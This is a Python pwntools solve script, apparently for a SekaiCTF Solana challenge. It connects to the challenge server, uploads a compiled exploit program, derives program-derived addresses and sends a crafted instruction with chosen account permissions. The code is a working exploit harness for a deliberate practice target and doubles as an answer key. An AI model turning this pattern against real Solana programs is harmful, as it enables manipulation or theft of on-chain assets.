import pwn
import codecs
from hashlib import sha256
from base58 import b58decode
from solders.pubkey import Pubkey
from solders.system_program import ID
from solders.sysvar import CLOCK

# The account order is important for Solang
# https://solang.readthedocs.io/en/latest/targets/solana.html#solana-account-management
account_metas = [
    ("user data", "sw"),
    ("user", "sw"),
    ("data account", "-w"),
    ("live bonus", "-w"),
    ("event info", "-w"),
    ("system", "-r"),
    ("clock", "-r"),
    ("program", "-r"),
]

HOST = "ibennto.chals.sekai.team"
PORT = 1337
p = pwn.remote(HOST, PORT, ssl=True)

with open("Solve.so", "rb") as f:
    solve = f.read()

p.sendlineafter(b"program pubkey: \n", b"So1bCJvDc3p3PoqbVB33h4qyHrPzikCeDfQ5kpAmjV6")
p.sendlineafter(b"program len: \n", str(len(solve)).encode())
p.send(solve)

accounts = {}
for l in p.recvuntil(b"num accounts: \n", drop=True).strip().split(b"\n"):
    [name, pubkey] = l.decode().split(": ")
    accounts[name] = pubkey

accounts["system"] = ID
accounts["clock"] = CLOCK
program_id = Pubkey.from_string(accounts["program"])
convert = lambda x: bytes.fromhex(codecs.encode(x, "hex").decode())
accounts["live bonus"] = Pubkey.find_program_address(
    [convert(b"LiveBonus"), b58decode(accounts["user"])], program_id
)[0]
accounts["event info"] = Pubkey.find_program_address(
    [convert(b"EventInfo"), b58decode(accounts["user"])], program_id
)[0]
instruction_data = sha256(b"global:new").digest()[:8] + b58decode(accounts["program"])

p.sendline(str(len(account_metas)).encode())
for name, perms in account_metas:
    p.sendline(f"{perms} {accounts[name]}".encode())
p.sendlineafter(b"ix len: \n", str(len(instruction_data)).encode())
p.send(instruction_data)

p.interactive()
